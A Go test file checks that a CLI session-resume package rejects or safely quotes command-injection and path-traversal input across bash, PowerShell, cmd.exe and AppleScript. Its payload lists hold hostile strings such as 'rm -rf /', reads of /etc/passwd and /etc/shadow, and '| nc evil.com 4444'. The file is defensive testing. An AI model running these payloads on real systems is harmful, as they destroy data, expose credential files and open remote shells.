package platform

import (
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"
)

// ---------------------------------------------------------------------------
// Command Injection Prevention — BuildResumeArgs / NewResumeCmd / shellQuote
// ---------------------------------------------------------------------------

func TestBuildResumeArgs_MaliciousSessionID(t *testing.T) {
	// Session IDs come from the SQLite database. If an attacker controls
	// the DB content, they could inject shell metacharacters. BuildResumeArgs
	// must not interpret them.
	payloads := []string{
		"; rm -rf /",
		"&& cat /etc/passwd",
		"| nc evil.com 4444",
		"$(whoami)",
		"`id`",
		"\"; rm -rf /; echo \"",
		"'; rm -rf /; echo '",
		"\n--allow-all",
		"--agent\tevil",
		"id\x00--extra-flag",
	}

	for _, payload := range payloads {
		t.Run(truncateForTestName(payload), func(t *testing.T) {
			args := BuildResumeArgs(payload, ResumeConfig{})

			// Must always be exactly ["--resume", <sessionID>].
			if len(args) != 2 {
				t.Fatalf("args len = %d, want 2; args = %v", len(args), args)
			}
			if args[0] != "--resume" {
				t.Errorf("args[0] = %q, want '--resume'", args[0])
			}
			// The session ID must pass through unchanged — BuildResumeArgs
			// does not sanitise (that's the exec layer's job), but it must
			// not split it into multiple arguments.
			if args[1] != payload {
				t.Errorf("args[1] = %q, want %q", args[1], payload)
			}
		})
	}
}

func TestBuildResumeArgs_MaliciousAgentModel(t *testing.T) {
	// Agent and Model are user-supplied config values that become
	// --agent <value> and --model <value> flags.
	malicious := ResumeConfig{
		Agent: "coder; rm -rf /",
		Model: "gpt-4 && cat /etc/shadow",
	}

	args := BuildResumeArgs("safe-session-id", malicious)

	// Verify the malicious values appear as single arguments, not split.
	agentIdx := -1
	modelIdx := -1
	for i, a := range args {
		if a == "--agent" {
			agentIdx = i
		}
		if a == "--model" {
			modelIdx = i
		}
	}

	if agentIdx == -1 || agentIdx+1 >= len(args) {
		t.Fatal("--agent not found in args")
	}
	if args[agentIdx+1] != malicious.Agent {
		t.Errorf("agent arg = %q, want %q", args[agentIdx+1], malicious.Agent)
	}

	if modelIdx == -1 || modelIdx+1 >= len(args) {
		t.Fatal("--model not found in args")
	}
	if args[modelIdx+1] != malicious.Model {
		t.Errorf("model arg = %q, want %q", args[modelIdx+1], malicious.Model)
	}
}

func TestNewResumeCmd_CustomCommand_EmptyAfterExpansion(t *testing.T) {
	// If custom command resolves to empty/whitespace, must error.
	_, err := NewResumeCmd("sess-1", ResumeConfig{CustomCommand: "   "})
	if err == nil {
		t.Fatal("NewResumeCmd should error on empty custom command")
	}
}

func TestNewResumeCmd_CustomCommand_SessionIDReplacement(t *testing.T) {
	// Verify {sessionId} is replaced correctly with a valid session ID.
	cmd, err := NewResumeCmd("abc-123", ResumeConfig{
		CustomCommand: "my-cli --resume {sessionId} --flag",
	})
	if err != nil {
		t.Fatalf("NewResumeCmd: %v", err)
	}

	// exec.Command(parts[0], parts[1:]...) — verify args.
	if cmd.Path == "" && len(cmd.Args) == 0 {
		t.Fatal("cmd has no path or args")
	}
	// The session ID should appear in the args, not in a concatenated string.
	found := false
	for _, a := range cmd.Args {
		if a == "abc-123" {
			found = true
			break
		}
	}
	if !found {
		t.Errorf("session ID 'abc-123' not found as individual arg in %v", cmd.Args)
	}
}

func TestNewResumeCmd_RejectsInjectionPayloads(t *testing.T) {
	// The code validates session IDs with a strict regex that only allows
	// [a-zA-Z0-9._-]. Malicious session IDs must be REJECTED, not passed
	// through to os/exec. This is the correct security behaviour.
	payloads := []string{
		"abc; rm -rf /",
		"$(whoami)",
		"`id`",
		"abc && cat /etc/passwd",
		"abc | nc evil.com 4444",
		`"malicious"`,
		"abc\nrm -rf /",
		"abc\x00extra",
		"../../../etc/passwd",
		"abc def",
	}

	for _, payload := range payloads {
		t.Run(truncateForTestName(payload), func(t *testing.T) {
			_, err := NewResumeCmd(payload, ResumeConfig{
				CustomCommand: "my-cli --resume {sessionId}",
			})
			if err == nil {
				t.Errorf("NewResumeCmd should reject malicious session ID %q", payload)
			}
		})
	}
}

func TestNewResumeCmd_AcceptsValidSessionIDs(t *testing.T) {
	// Valid session IDs should pass validation.
	valid := []string{
		"abc123",
		"session-abc-123",
		"sess.2024.01",
		"a",
		"A_B-C.D",
		"abcdefghijklmnopqrstuvwxyz0123456789",
	}

	for _, id := range valid {
		t.Run(id, func(t *testing.T) {
			_, err := NewResumeCmd(id, ResumeConfig{
				CustomCommand: "my-cli --resume {sessionId}",
			})
			if err != nil {
				t.Errorf("NewResumeCmd should accept valid session ID %q: %v", id, err)
			}
		})
	}
}

func TestValidateSessionID_RejectsTooLong(t *testing.T) {
	// The regex limits to 128 chars (1 required + 0..127 optional).
	longID := strings.Repeat("a", 129)
	err := validateSessionID(longID)
	if err == nil {
		t.Error("validateSessionID should reject 129-char session ID")
	}

	// 128 should be fine.
	okID := strings.Repeat("a", 128)
	err = validateSessionID(okID)
	if err != nil {
		t.Errorf("validateSessionID should accept 128-char session ID: %v", err)
	}
}

// ---------------------------------------------------------------------------
// shellQuote — edge cases for shell metacharacter quoting
// ---------------------------------------------------------------------------

func TestShellQuote_MetacharacterCoverage(t *testing.T) {
	// Every character listed in the ContainsAny check should trigger quoting.
	metachars := []string{
		" ", "\t", "\n", "\r", `"`, "'", "`", "$", "\\", "!",
		";", "|", "&", "<", ">", "(", ")", "{", "}",
	}

	for _, mc := range metachars {
		input := "before" + mc + "after"
		got := shellQuote(input)
		if !strings.HasPrefix(got, `'`) || !strings.HasSuffix(got, `'`) {
			t.Errorf("shellQuote(%q) = %q; expected single-quoted", input, got)
		}
	}
}

func TestShellQuote_DoubleQuoteEscaping(t *testing.T) {
	// Interior single quotes must be escaped with the '\'' idiom.
	got := shellQuote(`path'with'quotes`)
	if !strings.Contains(got, `'\''`) {
		t.Errorf("shellQuote should escape interior single quotes with '\\'' idiom, got %q", got)
	}
}

func TestShellQuote_NoUnnecessaryQuoting(t *testing.T) {
	safe := []string{
		"simple",
		"no-special-chars",
		"/usr/local/bin/app",
		"flag=value",
		"1234567890",
	}
	for _, s := range safe {
		got := shellQuote(s)
		if got != s {
			t.Errorf("shellQuote(%q) = %q; should not quote safe strings", s, got)
		}
	}
}

// ---------------------------------------------------------------------------
// psQuote — PowerShell quoting safety
// ---------------------------------------------------------------------------

func TestPsQuote_RemovesDoubleQuotes(t *testing.T) {
	input := `"C:\Program Files\app.exe" --flag "value"`
	got := psQuote(input)

	if strings.Contains(got, `"`) {
		t.Errorf("psQuote should replace double quotes with single quotes, got %q", got)
	}
	if !strings.HasPrefix(got, "& ") {
		t.Errorf("psQuote should start with '& ', got %q", got)
	}
}

func TestPsQuote_EscapesPowerShellMetachars(t *testing.T) {
	// $(Start-Process calc) must be escaped so PowerShell treats it as literal.
	input := `$(Start-Process calc)`
	got := psQuote(input)
	if !strings.Contains(got, "`$") {
		t.Errorf("psQuote should escape $, got %q", got)
	}
	if !strings.Contains(got, "`(") {
		t.Errorf("psQuote should escape (, got %q", got)
	}
	if !strings.Contains(got, "`)") {
		t.Errorf("psQuote should escape ), got %q", got)
	}
}

func TestPsQuote_EscapesSemicolonAndPipe(t *testing.T) {
	input := "cmd1; cmd2 | cmd3"
	got := psQuote(input)
	if !strings.Contains(got, "`;") {
		t.Errorf("psQuote should escape ;, got %q", got)
	}
	if !strings.Contains(got, "`|") {
		t.Errorf("psQuote should escape |, got %q", got)
	}
}

// ---------------------------------------------------------------------------
// cmdEscape — cmd.exe metacharacter escaping
// ---------------------------------------------------------------------------

func TestCmdEscape_EscapesMetachars(t *testing.T) {
	input := "cmd1 & cmd2 | cmd3 > file < input (group)"
	got := cmdEscape(input)
	if !strings.Contains(got, "^&") {
		t.Errorf("cmdEscape should escape &, got %q", got)
	}
	if !strings.Contains(got, "^|") {
		t.Errorf("cmdEscape should escape |, got %q", got)
	}
	if !strings.Contains(got, "^>") {
		t.Errorf("cmdEscape should escape >, got %q", got)
	}
	if !strings.Contains(got, "^<") {
		t.Errorf("cmdEscape should escape <, got %q", got)
	}
	if !strings.Contains(got, "^(") {
		t.Errorf("cmdEscape should escape (, got %q", got)
	}
	if !strings.Contains(got, "^)") {
		t.Errorf("cmdEscape should escape ), got %q", got)
	}
}

func TestCmdEscape_EscapesCaretFirst(t *testing.T) {
	// Caret must be escaped BEFORE other chars to avoid double-escaping.
	input := "^&"
	got := cmdEscape(input)
	want := "^^" + "^&"
	if got != want {
		t.Errorf("cmdEscape(%q) = %q, want %q", input, got, want)
	}
}

func TestCmdEscape_SafeStringUnchanged(t *testing.T) {
	input := "copilot --resume abc123"
	got := cmdEscape(input)
	if got != input {
		t.Errorf("cmdEscape should not modify safe string, got %q", got)
	}
}

func TestCmdEscape_EscapesPercent(t *testing.T) {
	input := "echo %PATH%"
	got := cmdEscape(input)
	if !strings.Contains(got, "%%PATH%%") {
		t.Errorf("cmdEscape should escape %% to %%%%, got %q", got)
	}
}

func TestCmdEscape_EscapesExclamation(t *testing.T) {
	input := "echo !var!"
	got := cmdEscape(input)
	if !strings.Contains(got, "^!") {
		t.Errorf("cmdEscape should escape ! to ^!, got %q", got)
	}
}

func TestCmdEscape_StripsNullBytes(t *testing.T) {
	input := "cmd\x00injected"
	got := cmdEscape(input)
	if strings.Contains(got, "\x00") {
		t.Errorf("cmdEscape should strip null bytes, got %q", got)
	}
	if got != "cmdinjected" {
		t.Errorf("cmdEscape should preserve non-null content, got %q", got)
	}
}

func TestShellQuote_StripsNullBytes(t *testing.T) {
	input := "path/to/\x00evil"
	got := shellQuote(input)
	if strings.Contains(got, "\x00") {
		t.Errorf("shellQuote should strip null bytes, got %q", got)
	}
}

func TestPsQuote_StripsNullBytes(t *testing.T) {
	input := "cmd\x00injected --arg"
	got := psQuote(input)
	if strings.Contains(got, "\x00") {
		t.Errorf("psQuote should strip null bytes, got %q", got)
	}
}

// ---------------------------------------------------------------------------
// escapeAppleScript — control character stripping
// ---------------------------------------------------------------------------

func TestEscapeAppleScript_StripsControlChars(t *testing.T) {
	// Control characters (newline, carriage return, null) must be stripped
	// to prevent breaking out of AppleScript string literals.
	input := "cmd\nwith\rnewlines\x00and\x07bells"
	got := escapeAppleScript(input)
	if strings.ContainsAny(got, "\n\r\x00\x07") {
		t.Errorf("escapeAppleScript should strip control characters, got %q", got)
	}
	// Printable content should survive.
	if !strings.Contains(got, "cmd") || !strings.Contains(got, "with") {
		t.Errorf("escapeAppleScript stripped too much, got %q", got)
	}
}

func TestEscapeAppleScript_StripsTab(t *testing.T) {
	input := "cmd\twith\ttabs"
	got := escapeAppleScript(input)
	if strings.Contains(got, "\t") {
		t.Errorf("escapeAppleScript should strip tab characters, got %q", got)
	}
}

func TestEscapeAppleScript_StripsDEL(t *testing.T) {
	input := "cmd\x7Fwith\x7Fdel"
	got := escapeAppleScript(input)
	if strings.Contains(got, "\x7F") {
		t.Errorf("escapeAppleScript should strip DEL (0x7F) character, got %q", got)
	}
}

// ---------------------------------------------------------------------------
// Path Traversal Prevention
// ---------------------------------------------------------------------------

func TestSessionStorePath_NoTraversalViaHOME(t *testing.T) {
	// Even if HOME contains "..", filepath.Join resolves it into the path
	// literally. The OS will then resolve it. But the returned path should
	// always be absolute and under the home dir.
	original := os.Getenv("HOME")
	if runtime.GOOS == "windows" {
		original = os.Getenv("USERPROFILE")
	}

	path, err := SessionStorePath()
	if err != nil {
		t.Fatalf("SessionStorePath: %v", err)
	}
	if !filepath.IsAbs(path) {
		t.Errorf("path should be absolute, got %q", path)
	}
	if !strings.HasSuffix(path, filepath.Join(".copilot", "session-store.db")) {
		t.Errorf("path should end with .copilot/session-store.db, got %q", path)
	}

	_ = original // suppress unused
}

func TestConfigDir_NoTraversal(t *testing.T) {
	dir, err := ConfigDir()
	if err != nil {
		t.Fatalf("ConfigDir: %v", err)
	}
	if !filepath.IsAbs(dir) {
		t.Errorf("ConfigDir should return absolute path, got %q", dir)
	}
	if filepath.Base(dir) != "dispatch" {
		t.Errorf("ConfigDir should end with 'dispatch', got %q", dir)
	}
	// Verify no ".." components remain in the cleaned path.
	cleaned := filepath.Clean(dir)
	if cleaned != dir {
		t.Errorf("ConfigDir contains non-clean path: %q vs clean %q", dir, cleaned)
	}
}

func TestConfigDir_TraversalInEnvVar(t *testing.T) {
	tmpDir := t.TempDir()

	// Set the config base directory to include traversal sequences.
	// filepath.Join in ConfigDir will resolve them lexically.
	traversalDir := filepath.Join(tmpDir, "..", filepath.Base(tmpDir))

	switch runtime.GOOS {
	case "windows":
		t.Setenv("APPDATA", traversalDir)
	case "darwin":
		t.Setenv("HOME", traversalDir)
		appSupport := filepath.Join(traversalDir, "Library", "Application Support")
		if err := os.MkdirAll(appSupport, 0o755); err != nil {
			t.Skipf("cannot create macOS config structure: %v", err)
		}
	default:
		t.Setenv("XDG_CONFIG_HOME", traversalDir)
	}

	dir, err := ConfigDir()
	if err != nil {
		t.Fatalf("ConfigDir: %v", err)
	}

	// The path should be absolute and end with "dispatch".
	if !filepath.IsAbs(dir) {
		t.Errorf("ConfigDir should be absolute even with traversal in env, got %q", dir)
	}
	if filepath.Base(dir) != "dispatch" {
		t.Errorf("ConfigDir should end with 'dispatch', got %q", dir)
	}
}

// ---------------------------------------------------------------------------
// Error message security — platform errors
// ---------------------------------------------------------------------------

func TestSessionStorePath_ErrorDoesNotLeakEnvContent(t *testing.T) {
	// On most systems this won't error, but we verify the happy path
	// doesn't include sensitive env vars in the returned path metadata.
	path, err := SessionStorePath()
	if err != nil {
		// If it errors, the message should not contain sensitive env vars.
		msg := err.Error()
		for _, env := range []string{"API_KEY", "PASSWORD", "SECRET", "TOKEN"} {
			val := os.Getenv(env)
			if val != "" && strings.Contains(msg, val) {
				t.Errorf("error message leaks env var %s value", env)
			}
		}
		return
	}
	_ = path
}

// ---------------------------------------------------------------------------
// Command injection via buildResumeCommandString (internal)
// ---------------------------------------------------------------------------

func TestBuildResumeCommandString_RejectsInjectionPayloads(t *testing.T) {
	// buildResumeCommandString validates session IDs via validateSessionID.
	// Malicious payloads with shell metacharacters must be REJECTED before
	// they reach the command string.
	payloads := []string{
		`"; rm -rf / "`,
		"$(cat /etc/passwd)",
		"`whoami`",
		"abc\nrm -rf /",
		"abc\x00--extra",
		"'; DROP TABLE sessions;--",
	}

	for _, payload := range payloads {
		t.Run(truncateForTestName(payload), func(t *testing.T) {
			_, err := buildResumeCommandString(payload, ResumeConfig{
				CustomCommand: "my-cli --resume {sessionId}",
			})
			if err == nil {
				t.Errorf("buildResumeCommandString should reject malicious session ID %q", payload)
			}
		})
	}
}

func TestBuildResumeCommandString_AcceptsValidSessionID(t *testing.T) {
	// Valid session IDs should produce a valid command string.
	cmd, err := buildResumeCommandString("valid-session.123", ResumeConfig{
		CustomCommand: "my-cli --resume {sessionId}",
	})
	if err != nil {
		t.Fatalf("buildResumeCommandString: %v", err)
	}
	if !strings.Contains(cmd, "valid-session.123") {
		t.Errorf("command string should contain session ID, got %q", cmd)
	}
}

func TestBuildResumeCommandString_EmptyCustomCommand(t *testing.T) {
	// With a valid session ID and a custom command that has only the
	// placeholder, replacement produces just the session ID.
	cmd, err := buildResumeCommandString("sess-1", ResumeConfig{
		CustomCommand: "   {sessionId}   ",
	})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if !strings.Contains(cmd, "sess-1") {
		t.Errorf("expected sess-1 in command, got %q", cmd)
	}

	// Empty string as session ID is rejected by validation, not by the
	// custom command expansion logic.
	_, err = buildResumeCommandString("", ResumeConfig{
		CustomCommand: "   {sessionId}   ",
	})
	if err == nil {
		t.Fatal("expected error when session ID is empty")
	}
}

// ---------------------------------------------------------------------------
// buildStartCmdLine — default (bash) path quoting
// ---------------------------------------------------------------------------

func TestBuildStartCmdLine_DefaultPathQuotesResumeCmd(t *testing.T) {
	if runtime.GOOS != "windows" {
		t.Skip("buildStartCmdLine is only used on Windows")
	}
	// Git Bash shell hits the default path in buildStartCmdLine.
	// The resume command must be wrapped in double quotes after -c,
	// and for Git Bash specifically, backslashes must be converted to
	// forward slashes so bash does not consume them as escape chars.
	shell := ShellInfo{Name: "Git Bash", Path: `C:\Program Files\Git\bin\bash.exe`, Args: []string{"--login"}}
	resumeCmd := `"C:\Users\user\copilot.cmd" "--resume" "sess-123"`
	got := buildStartCmdLine(shell, resumeCmd)

	// Backslashes should be converted to forward slashes for Git Bash,
	// and double quotes should become single quotes so bash treats paths
	// literally (protecting spaces in paths like "Program Files").
	// cmdQuote wraps the result in double quotes for cmd.exe.
	expected := ` -c "'C:/Users/user/copilot.cmd' '--resume' 'sess-123'"`
	if !strings.Contains(got, expected) {
		t.Errorf("buildStartCmdLine Git Bash should convert to single-quoted forward-slash paths;\ngot:  %s\nwant substring: %s", got, expected)
	}
}

func TestBuildStartCmdLine_DefaultPathEscapesMetachars(t *testing.T) {
	if runtime.GOOS != "windows" {
		t.Skip("buildStartCmdLine is only used on Windows")
	}
	shell := ShellInfo{Name: "WSL", Path: `C:\Windows\System32\wsl.exe`}
	// Simulate a resume command containing cmd.exe metacharacters
	// (this wouldn't normally happen with validated session IDs, but
	// is a defense-in-depth test for custom commands).
	resumeCmd := `ghcs --resume safe-id & echo injected`
	got := buildStartCmdLine(shell, resumeCmd)

	// The & must be inside double quotes so cmd.exe does not interpret it
	// as a command separator.
	if !strings.Contains(got, `"ghcs --resume safe-id & echo injected"`) {
		t.Errorf("buildStartCmdLine should wrap entire resumeCmd in quotes;\ngot: %s", got)
	}
}

// ---------------------------------------------------------------------------
// Helper
// ---------------------------------------------------------------------------

func truncateForTestName(s string) string {
	safe := strings.Map(func(r rune) rune {
		if r == '/' || r == '\\' || r == '\'' || r == '"' || r == ' ' || r == ';' || r < 32 || r > 126 {
			return '_'
		}
		return r
	}, s)
	if len(safe) > 40 {
		safe = safe[:40]
	}
	return safe
}

// ---------------------------------------------------------------------------
// isGitBash detection
// ---------------------------------------------------------------------------

func TestIsGitBash(t *testing.T) {
	tests := []struct {
		name string
		shell ShellInfo
		want  bool
	}{
		{"Git Bash by path", ShellInfo{Name: "Git Bash", Path: `C:\Program Files\Git\bin\bash.exe`}, true},
		{"Git Bash by name only", ShellInfo{Name: "Git Bash", Path: `C:\some\bash.exe`}, true},
		{"Git Bash lowercase", ShellInfo{Name: "something", Path: `c:\program files\git\bin\bash.exe`}, true},
		{"Git Bash name case insensitive", ShellInfo{Name: "git bash", Path: `C:\some\bash.exe`}, true},
		{"Git Bash name mixed case", ShellInfo{Name: "GIT BASH", Path: `C:\some\bash.exe`}, true},
		{"WSL not Git Bash", ShellInfo{Name: "WSL", Path: `C:\Windows\System32\wsl.exe`}, false},
		{"PowerShell", ShellInfo{Name: "PowerShell 7", Path: `C:\pwsh.exe`}, false},
		{"cmd", ShellInfo{Name: "Command Prompt", Path: `C:\Windows\System32\cmd.exe`}, false},
		{"Unix bash", ShellInfo{Name: "bash", Path: "/bin/bash"}, false},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := isGitBash(tt.shell)
			if got != tt.want {
				t.Errorf("isGitBash(%+v) = %v, want %v", tt.shell, got, tt.want)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// bashifyCmd path conversion
// ---------------------------------------------------------------------------

func TestBashifyCmd(t *testing.T) {
	tests := []struct {
		name  string
		input string
		want  string
	}{
		{
			"Windows path with backslashes",
			`"C:\Users\user\AppData\Roaming\npm\copilot.cmd" "--resume" "sess-123"`,
			`'C:/Users/user/AppData/Roaming/npm/copilot.cmd' '--resume' 'sess-123'`,
		},
		{
			"No backslashes unchanged",
			`"ghcs" "--resume" "sess-123"`,
			`'ghcs' '--resume' 'sess-123'`,
		},
		{
			"Multiple backslash segments",
			`"C:\Program Files\Git\bin\ghcs.exe" "--resume" "abc"`,
			`'C:/Program Files/Git/bin/ghcs.exe' '--resume' 'abc'`,
		},
		{
			"Space in path preserved by single quotes",
			`"C:\Program Files\nodejs\copilot.cmd" "--resume" "abc"`,
			`'C:/Program Files/nodejs/copilot.cmd' '--resume' 'abc'`,
		},
		{
			"Single quote in path escaped",
			`"C:\Program Files\Bob's Tools\ghcs.exe" "--resume" "sess-123"`,
			`'C:/Program Files/Bob'\''s Tools/ghcs.exe' '--resume' 'sess-123'`,
		},
		{
			"Multiple single quotes in path",
			`"C:\It's\Bob's\file.exe" "--resume" "abc"`,
			`'C:/It'\''s/Bob'\''s/file.exe' '--resume' 'abc'`,
		},
		{
			"UNC path",
			`"\\server\share\copilot.cmd" "--resume" "sess-123"`,
			`'//server/share/copilot.cmd' '--resume' 'sess-123'`,
		},
		{
			"Empty string",
			"",
			"",
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := bashifyCmd(tt.input)
			if got != tt.want {
				t.Errorf("bashifyCmd() = %q, want %q", got, tt.want)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// buildStartCmdLine — WSL should NOT convert backslashes
// ---------------------------------------------------------------------------

func TestBuildStartCmdLine_WSLNoBackslashConversion(t *testing.T) {
	if runtime.GOOS != "windows" {
		t.Skip("buildStartCmdLine is only used on Windows")
	}
	shell := ShellInfo{Name: "WSL", Path: `C:\Windows\System32\wsl.exe`}
	resumeCmd := `"C:\Users\user\copilot.cmd" "--resume" "sess-123"`
	got := buildStartCmdLine(shell, resumeCmd)

	// WSL is not Git Bash, so backslashes should be preserved.
	if strings.Contains(got, "C:/Users") {
		t.Errorf("buildStartCmdLine should NOT convert backslashes for WSL;\ngot: %s", got)
	}
	// Original backslash path should be present (inside cmdQuote wrapping).
	if !strings.Contains(got, `C:\Users\user\copilot.cmd`) {
		t.Errorf("buildStartCmdLine should preserve backslash path for WSL;\ngot: %s", got)
	}
}
